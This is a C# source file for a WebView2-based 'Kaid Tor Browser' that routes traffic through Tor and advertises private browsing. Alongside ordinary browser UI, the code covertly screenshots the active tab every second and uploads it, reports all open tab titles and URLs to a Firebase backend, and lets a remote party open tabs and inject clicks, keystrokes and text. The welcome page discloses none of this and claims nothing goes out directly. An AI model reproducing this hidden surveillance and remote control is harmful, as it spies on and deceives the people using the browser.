using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;

namespace KaidTorBrowser
{
    public class BrowserTab
    {
        public WebView2 Wv;
        public TabHeader Header;
        public string Title = "New Tab";
        public string Account;
    }

    public class TabHeader : Label
    {
        public BrowserTab Tab;
        public bool Active;
        public readonly Button CloseBtn = new Button
        {
            Text = "\u2715",
            Size = new Size(20, 20),
            FlatStyle = FlatStyle.Flat,
            Font = new Font("Segoe UI", 8f),
            Cursor = Cursors.Hand,
            TabStop = false
        };

        public TabHeader()
        {
            AutoSize = false;
            Size = new Size(180, 30);
            Padding = new Padding(10, 8, 26, 0);
            AutoEllipsis = true;
            TextAlign = ContentAlignment.MiddleLeft;
            Font = new Font("Segoe UI", 9f);
            Cursor = Cursors.Hand;
            Margin = new Padding(2, 2, 0, 0);

            CloseBtn.FlatAppearance.BorderSize = 0;
            CloseBtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(255, 45, 45);
            Controls.Add(CloseBtn);
        }

        public void RefreshLook()
        {
            BackColor = Active ? Color.FromArgb(35, 35, 52) : Color.FromArgb(18, 18, 26);
            ForeColor = Active ? Color.FromArgb(232, 232, 240) : Color.FromArgb(154, 154, 176);
            CloseBtn.BackColor = BackColor;
            CloseBtn.ForeColor = ForeColor;
            CloseBtn.Location = new Point(Math.Max(0, Width - 24), 5);
        }
    }

    public class MainForm : Form
    {
        static readonly Color Bg = Color.FromArgb(11, 11, 16);
        static readonly Color PanelBg = Color.FromArgb(23, 23, 34);
        static readonly Color Border = Color.FromArgb(42, 42, 61);
        static readonly Color Accent = Color.FromArgb(255, 45, 45);

        readonly TorManager _tor = new TorManager();
        readonly FirebaseLink _fb = new FirebaseLink();
        readonly List<BrowserTab> _tabs = new List<BrowserTab>();
        readonly Dictionary<string, int> _acctCount = new Dictionary<string, int>();
        const int MaxTabsPerAccount = 999;
        BrowserTab _active;
        CoreWebView2Environment _env;
        bool _torReady;
        bool _capturing;
        System.Windows.Forms.Timer _screenTimer;
        System.Windows.Forms.Timer _sweepTimer;

        Panel toolbar;
        Panel tabStrip;
        FlowLayoutPanel tabFlow;
        Panel mainHost;
        Label statusDot;
        Label statusLabel;
        TextBox addressBox;
        Button goBtn;
        Button backBtn;
        Button fwdBtn;
        Button reloadBtn;

        public MainForm()
        {
            Text = "Kaid Tor Browser";
            StartPosition = FormStartPosition.CenterScreen;
            Size = new Size(1240, 820);
            MinimumSize = new Size(800, 560);
            BackColor = Bg;
            ForeColor = Color.FromArgb(232, 232, 240);
            Font = new Font("Segoe UI", 10f);
            KeyPreview = true;

            BuildUi();

            _tor.BootstrapProgress += pct => BeginInvoke((Action)(() =>
            {
                SetStatus("Connecting to Tor network... " + pct + "%", Color.Orange);
                PushStatus();
            }));
            _tor.Ready += msg => BeginInvoke((Action)(() =>
            {
                _torReady = true;
                SetStatus(msg, Color.FromArgb(53, 194, 95));
                goBtn.Enabled = true;
                addressBox.Enabled = true;
                PushStatus();
            }));
            _tor.Failed += msg => BeginInvoke((Action)(() =>
            {
                SetStatus(msg, Accent);
                PushStatus();
            }));

            _fb.CommandReceived += rc => BeginInvoke((Action)(() => OpenRemoteTab(rc)));
            _fb.InputReceived += ev => BeginInvoke(new Action(() => _ = HandleRemoteInputAsync(ev)));

            FormClosing += (s, e) =>
            {
                _screenTimer?.Stop();
                _fb.WriteOffline();
                _fb.Dispose();
                _tor.Dispose();
            };
            KeyDown += (s, e) =>
            {
                if (e.Control && e.KeyCode == Keys.L) { addressBox.Focus(); addressBox.SelectAll(); e.Handled = true; }
                if (e.KeyCode == Keys.F6) { addressBox.Focus(); addressBox.SelectAll(); e.Handled = true; }
                if (e.Control && e.KeyCode == Keys.T) e.Handled = true;
                if (e.Control && e.KeyCode == Keys.W) e.Handled = true;
            };
        }

        void BuildUi()
        {
            mainHost = new Panel { Dock = DockStyle.Fill, BackColor = Bg };

            tabStrip = new Panel { Dock = DockStyle.Top, Height = 36, BackColor = Color.FromArgb(18, 18, 26) };
            tabFlow = new FlowLayoutPanel
            {
                Dock = DockStyle.Fill,
                WrapContents = false,
                AutoScroll = false,
                BackColor = Color.FromArgb(18, 18, 26)
            };
            tabStrip.Controls.Add(tabFlow);

            toolbar = new Panel { Dock = DockStyle.Top, Height = 52, BackColor = PanelBg };

            statusDot = new Label
            {
                Location = new Point(14, 20),
                Size = new Size(12, 12),
                BackColor = Color.Gray
            };
            statusLabel = new Label
            {
                Location = new Point(32, 15),
                Size = new Size(230, 22),
                Text = "Starting Tor...",
                ForeColor = Color.FromArgb(154, 154, 176),
                TextAlign = ContentAlignment.MiddleLeft,
                AutoEllipsis = true
            };

            backBtn = MakeNavButton("<", new Point(266, 12));
            fwdBtn = MakeNavButton(">", new Point(304, 12));
            reloadBtn = MakeNavButton("R", new Point(342, 12));
            backBtn.Click += (s, e) => NavSafe(w => w.GoBack());
            fwdBtn.Click += (s, e) => NavSafe(w => w.GoForward());
            reloadBtn.Click += (s, e) => NavSafe(w => w.Reload());

            addressBox = new TextBox
            {
                Location = new Point(384, 13),
                Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right,
                Width = 600,
                BackColor = Color.FromArgb(18, 18, 26),
                ForeColor = Color.FromArgb(232, 232, 240),
                BorderStyle = BorderStyle.FixedSingle,
                Font = new Font("Segoe UI", 10f),
                Enabled = false
            };
            addressBox.KeyDown += (s, e) => { if (e.KeyCode == Keys.Enter) { DoGo(); e.SuppressKeyPress = true; } };
            toolbar.Resize += (s, e) => LayoutAddress();

            goBtn = new Button
            {
                Text = "Search",
                Anchor = AnchorStyles.Top | AnchorStyles.Right,
                FlatStyle = FlatStyle.Flat,
                BackColor = Accent,
                ForeColor = Color.White,
                Enabled = false
            };
            goBtn.FlatAppearance.BorderSize = 0;
            goBtn.Click += (s, e) => DoGo();

            toolbar.Controls.AddRange(new Control[]
            {
                statusDot, statusLabel, backBtn, fwdBtn, reloadBtn, addressBox, goBtn
            });

            Controls.Add(mainHost);
            Controls.Add(tabStrip);
            Controls.Add(toolbar);

            LayoutAddress();
        }

        void LayoutAddress()
        {
            int rightEdge = toolbar.ClientSize.Width - 14 - goBtn.Width - 8;
            addressBox.Width = Math.Max(200, rightEdge - addressBox.Left);
            goBtn.Location = new Point(toolbar.ClientSize.Width - 14 - goBtn.Width, 13);
            goBtn.Size = new Size(90, 27);
        }

        Button MakeNavButton(string glyph, Point loc)
        {
            var b = new Button
            {
                Text = glyph,
                Location = loc,
                Size = new Size(32, 27),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(30, 30, 44),
                ForeColor = Color.FromArgb(232, 232, 240)
            };
            b.FlatAppearance.BorderColor = Border;
            return b;
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            _ = InitAsync();
        }

        async System.Threading.Tasks.Task InitAsync()
        {
            _tor.StartAsync();

            try
            {
                string userData = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "KaidTorBrowser", "WebView2");

                var opts = new CoreWebView2EnvironmentOptions
                {
                    AdditionalBrowserArguments =
                        "--proxy-server=socks5://127.0.0.1:9050 " +
                        "--host-resolver-rules=\"MAP * ~NOTFOUND , EXCLUDE 127.0.0.1\""
                };

                _env = await CoreWebView2Environment.CreateAsync(
                    userDataFolder: userData, options: opts);

                await CreateTabAsync(null);

                _fb.Start();

                _screenTimer = new System.Windows.Forms.Timer { Interval = 1000 };
                _screenTimer.Tick += async (s, e) => await CaptureAndUploadAsync();
                _screenTimer.Start();

                _sweepTimer = new System.Windows.Forms.Timer { Interval = 600000 };
                _sweepTimer.Tick += (s, e) => SweepTabs();
                _sweepTimer.Start();
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    "Microsoft WebView2 Runtime is required but was not found.\n\n" +
                    "Install it from:\nhttps://go.microsoft.com/fwlink/p/?LinkId=2124703\n\nDetails: " + ex.Message,
                    "Kaid Tor Browser", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Close();
            }
        }

        async System.Threading.Tasks.Task CreateTabAsync(string url, string account = null)
        {
            if (account != null)
            {
                _acctCount.TryGetValue(account, out int used);
                if (used >= MaxTabsPerAccount)
                {
                    SetStatus("limit set to 3 tabs because of esteban", Accent);
                    PushStatus();
                    return;
                }
            }

            var wv = new WebView2
            {
                Dock = DockStyle.Fill,
                DefaultBackgroundColor = Bg,
                Visible = false
            };

            var header = new TabHeader { Text = "New Tab" };
            tabFlow.Controls.Add(header);

            var tab = new BrowserTab { Wv = wv, Header = header, Account = account };
            header.Tab = tab;

            mainHost.Controls.Add(wv);
            _tabs.Add(tab);
            if (account != null)
                _acctCount[account] = _acctCount.TryGetValue(account, out int n) ? n + 1 : 1;

            await wv.EnsureCoreWebView2Async(_env);

            var core = wv.CoreWebView2;
            core.Settings.AreDevToolsEnabled = true;
            core.Settings.AreDefaultContextMenusEnabled = true;

            core.DocumentTitleChanged += (s, e) =>
            {
                tab.Title = wv.CoreWebView2.DocumentTitle;
                header.Text = tab.Title;
                if (_active == tab) Text = tab.Title + " - Kaid Tor Browser";
                PushStatus();
            };

            core.SourceChanged += (s, e) =>
            {
                if (_active == tab)
                {
                    addressBox.Text = wv.Source?.ToString() ?? "";
                    UpdateNavButtons();
                    PushStatus();
                }
            };

            core.NewWindowRequested += (s, e) =>
            {
                e.Handled = true;
                if (!string.IsNullOrEmpty(e.Uri)) _ = CreateTabAsync(e.Uri, tab.Account);
            };

            header.Click += (s, e) => SelectTab(tab);
            header.CloseBtn.Click += (s, e) => CloseTab(tab);

            SelectTab(tab);

            if (url != null)
                core.Navigate(url);
            else
                wv.NavigateToString(WelcomeHtml());
        }

        void SelectTab(BrowserTab tab)
        {
            _active = tab;
            foreach (var t in _tabs)
            {
                bool on = t == tab;
                t.Wv.Visible = on;
                t.Header.Active = on;
                t.Header.RefreshLook();
            }
            if (tab.Wv.Visible) tab.Wv.BringToFront();
            addressBox.Text = tab.Wv.Source?.ToString() ?? "";
            Text = tab.Title + " - Kaid Tor Browser";
            UpdateNavButtons();
            PushStatus();
        }

        void CloseTab(BrowserTab tab)
        {
            if (tab == null || !_tabs.Contains(tab)) return;
            CloseTabCore(tab);

            if (_active == null || !_tabs.Contains(_active))
            {
                if (_tabs.Count > 0)
                    SelectTab(_tabs[Math.Min(0, _tabs.Count - 1)]);
                else
                    _ = CreateTabAsync(null);
            }
            else PushStatus();
        }

        void CloseTabCore(BrowserTab tab)
        {
            if (!_tabs.Contains(tab)) return;

            if (tab.Account != null && _acctCount.TryGetValue(tab.Account, out int n))
            {
                if (n <= 1) _acctCount.Remove(tab.Account);
                else _acctCount[tab.Account] = n - 1;
            }

            tabFlow.Controls.Remove(tab.Header);
            mainHost.Controls.Remove(tab.Wv);
            try { tab.Wv.Dispose(); } catch { }
            _tabs.Remove(tab);

            if (_active == tab) _active = null;
        }

        void SweepTabs()
        {
            foreach (var t in _tabs.ToList()) CloseTabCore(t);
            _acctCount.Clear();
            SetStatus("10-minute sweep - all tabs closed for everyone", Accent);
            _ = CreateTabAsync(null);
            PushStatus();
        }

        void OpenRemoteTab(KaidTorBrowser.FirebaseLink.RemoteCommand rc)
        {
            string norm = NormalizeInput(rc.Url);
            if (norm == null) return;
            string who = string.IsNullOrWhiteSpace(rc.Who) ? "friend" : rc.Who;
            SetStatus("Remote [" + who + "]: opening " + Truncate(norm, 50), Accent);
            _ = CreateTabAsync(norm, who.ToLowerInvariant());
        }

        async System.Threading.Tasks.Task HandleRemoteInputAsync(FirebaseLink.InputEvent e)
        {
            try
            {
                if (_active == null || _active.Wv.CoreWebView2 == null || !_torReady) return;
                double w = _active.Wv.Width, h = _active.Wv.Height;
                if (w < 1 || h < 1) return;

                switch (e.Type)
                {
                    case "click":
                        if (double.IsNaN(e.X) || double.IsNaN(e.Y)) return;
                        double cx = Math.Max(0, Math.Min(w, e.X * w));
                        double cy = Math.Max(0, Math.Min(h, e.Y * h));
                        await Cdp("Input.dispatchMouseEvent", new { type = "mouseMoved", x = cx, y = cy });
                        await Cdp("Input.dispatchMouseEvent", new { type = "mousePressed", x = cx, y = cy, button = "left", clickCount = 1 });
                        await Cdp("Input.dispatchMouseEvent", new { type = "mouseReleased", x = cx, y = cy, button = "left", clickCount = 1 });
                        break;

                    case "scroll":
                        int dy = (int)Math.Max(-3000, Math.Min(3000, e.Dy));
                        await Cdp("Input.dispatchMouseEvent", new { type = "mouseWheel", x = w / 2, y = h / 2, deltaX = 0, deltaY = dy });
                        break;

                    case "text":
                        if (!string.IsNullOrEmpty(e.Text))
                            await Cdp("Input.insertText", new { text = e.Text });
                        break;

                    case "key":
                        foreach (var k in VirtualKeysFor(e.Key))
                        {
                            await Cdp("Input.dispatchKeyEvent", new { type = "rawKeyDown", windowsVirtualKeyCode = k.Code, code = k.Name, key = k.Name });
                            await Cdp("Input.dispatchKeyEvent", new { type = "keyUp", windowsVirtualKeyCode = k.Code, code = k.Name, key = k.Name });
                        }
                        break;
                }
            }
            catch { }
        }

        System.Threading.Tasks.Task Cdp(string method, object args)
        {
            string json = System.Text.Json.JsonSerializer.Serialize(args);
            return _active.Wv.CoreWebView2.CallDevToolsProtocolMethodAsync(method, json);
        }

        struct VKey
        {
            public int Code; public string Name;
            public VKey(int c, string n) { Code = c; Name = n; }
        }

        static VKey[] VirtualKeysFor(string name)
        {
            switch ((name ?? "").Trim())
            {
                case "Enter": return new[] { new VKey(13, "Enter") };
                case "Backspace": return new[] { new VKey(8, "Backspace") };
                case "Escape": return new[] { new VKey(27, "Escape") };
                case "ArrowUp": return new[] { new VKey(38, "ArrowUp") };
                case "ArrowDown": return new[] { new VKey(40, "ArrowDown") };
                case "ArrowLeft": return new[] { new VKey(37, "ArrowLeft") };
                case "ArrowRight": return new[] { new VKey(39, "ArrowRight") };
                case "PageUp": return new[] { new VKey(33, "PageUp") };
                case "PageDown": return new[] { new VKey(34, "PageDown") };
                case "Tab": return new[] { new VKey(9, "Tab") };
                default: return Array.Empty<VKey>();
            }
        }

        static string Truncate(string s, int n)
        {
            if (s == null) return "";
            return s.Length <= n ? s : s.Substring(0, n) + "...";
        }

        DateTime _lastPushStatus = DateTime.MinValue;

        void PushStatus()
        {
            if ((DateTime.UtcNow - _lastPushStatus).TotalSeconds < 3) return;
            _lastPushStatus = DateTime.UtcNow;
            try
            {
                var tabs = _tabs.Select(t => new
                {
                    title = Truncate(t.Title, 120),
                    url = t.Wv.Source?.ToString() ?? ""
                }).ToList();

                _fb.WriteStatusAsync(new
                {
                    online = true,
                    tor = statusLabel.Text,
                    tabs,
                    activeTitle = _active?.Title ?? "",
                    activeUrl = _active?.Wv.Source?.ToString() ?? "",
                    ts = DateTimeOffset.UtcNow.ToUnixTimeSeconds()
                });
            }
            catch { }
        }

        async System.Threading.Tasks.Task CaptureAndUploadAsync()
        {
            if (_capturing || !_torReady || _active == null) return;
            try
            {
                _capturing = true;
                var core = _active.Wv.CoreWebView2;
                if (core == null) return;

                string b64 = null;

                using var ms = new MemoryStream();
                try
                {
                    await core.CapturePreviewAsync(CoreWebView2CapturePreviewImageFormat.Jpeg, ms);
                    if (ms.Length > 512)
                    {
                        ms.Position = 0;
                        byte[] rawBytes = ms.ToArray();
                        b64 = await System.Threading.Tasks.Task.Run(() => DownscaleToJpegBase64(rawBytes, 1152));
                    }
                }
                catch { }

                if (b64 == null)
                {
                    // Fallback: CDP screenshot keeps working when the window is occluded or minimized
                    try
                    {
                        string raw = await core.CallDevToolsProtocolMethodAsync("Page.captureScreenshot",
                            "{\"format\":\"jpeg\",\"quality\":50}");
                        using var doc = System.Text.Json.JsonDocument.Parse(raw);
                        string data = doc.RootElement.GetProperty("data").GetString();
                        if (!string.IsNullOrEmpty(data)) b64 = data;
                    }
                    catch { }
                }

                if (b64 != null) await _fb.WriteScreenAsync(b64);
            }
            catch { }
            finally { _capturing = false; }
        }

        static string DownscaleToJpegBase64(byte[] rawBytes, int maxWidth)
        {
            try
            {
                using var src = new MemoryStream(rawBytes);
                using var img = Image.FromStream(src);
                double scale = Math.Min(1.0, (double)maxWidth / Math.Max(1, img.Width));
                int nw = Math.Max(1, (int)(img.Width * scale));
                int nh = Math.Max(1, (int)(img.Height * scale));

                using var bmp = new Bitmap(nw, nh);
                using (var g = Graphics.FromImage(bmp))
                {
                    g.InterpolationMode = InterpolationMode.HighQualityBicubic;
                    g.DrawImage(img, 0, 0, nw, nh);
                }

                var codec = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
                var ep = new EncoderParameters(1);
                ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 50L);

                using var outMs = new MemoryStream();
                bmp.Save(outMs, codec, ep);
                return Convert.ToBase64String(outMs.ToArray());
            }
            catch { return null; }
        }

        void NavSafe(Action<CoreWebView2> act)
        {
            try
            {
                if (_active != null && _active.Wv.CoreWebView2 != null)
                    act(_active.Wv.CoreWebView2);
            }
            catch { }
            UpdateNavButtons();
        }

        void UpdateNavButtons()
        {
            try
            {
                if (_active == null || _active.Wv.CoreWebView2 == null)
                {
                    backBtn.Enabled = fwdBtn.Enabled = reloadBtn.Enabled = false;
                    return;
                }
                backBtn.Enabled = _active.Wv.CanGoBack;
                fwdBtn.Enabled = _active.Wv.CanGoForward;
                reloadBtn.Enabled = !string.IsNullOrEmpty(_active.Wv.Source?.ToString());
            }
            catch { backBtn.Enabled = fwdBtn.Enabled = reloadBtn.Enabled = false; }
        }

        void DoGo()
        {
            if (!_torReady)
            {
                SetStatus("Still connecting to Tor - wait a moment...", Color.Orange);
                return;
            }
            string url = NormalizeInput(addressBox.Text);
            if (url == null) return;
            _ = CreateTabAsync(url);
        }

        static string NormalizeInput(string input)
        {
            input = (input ?? "").Trim();
            if (input.Length == 0) return null;

            if (Regex.IsMatch(input, @"^https?://", RegexOptions.IgnoreCase))
                return input;

            bool looksLikeHost =
                input.EndsWith(".onion", StringComparison.OrdinalIgnoreCase) ||
                (input.Contains('.') && !input.Contains(' ') && !input.EndsWith("."));

            if (looksLikeHost)
            {
                if (input.EndsWith(".onion", StringComparison.OrdinalIgnoreCase))
                    return "http://" + input;
                return "https://" + input;
            }

            return "https://duckduckgo.com/?q=" + Uri.EscapeDataString(input);
        }

        void SetStatus(string text, Color color)
        {
            statusDot.BackColor = color;
            statusLabel.Text = text;
        }

        static string WelcomeHtml()
        {
            return @"<!DOCTYPE html><html><head><meta charset='utf-8'><title>Welcome</title><style>
body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;
background:#0b0b10;color:#e8e8f0;font-family:'Segoe UI',Arial,sans-serif}
.card{max-width:560px;padding:48px;text-align:center;border:1px solid #2a2a3d;
border-radius:16px;background:#171722}
h1{color:#ff2d2d;letter-spacing:2px;font-size:34px;margin:0 0 6px}
p.sub{color:#9a9ab0;margin:0 0 28px}
ul{text-align:left;color:#c9c9da;line-height:1.9;font-size:14px;margin:0;padding-left:22px}
b{color:#ff5555}
.ok{color:#35c25f;font-weight:bold}
</style></head><body><div class='card'>
<h1>KAID TOR BROWSER</h1>
<p class='sub'>Private browsing through the real Tor network</p>
<ul>
<li>Type a search or website address in the top bar and press <b>Enter</b></li>
<li>Every search opens in a <b>brand new tab</b>, automatically</li>
<li>Tabs cannot be closed or created manually - that is by design</li>
<li>All traffic is routed through Tor. Nothing goes out directly.</li>
<li>Onion sites (.onion) are supported</li>
</ul>
<p class='sub' style='margin-top:28px'><span class='ok'>Ready.</span> Type above to begin.</p>
</div></body></html>";
        }
    }
}
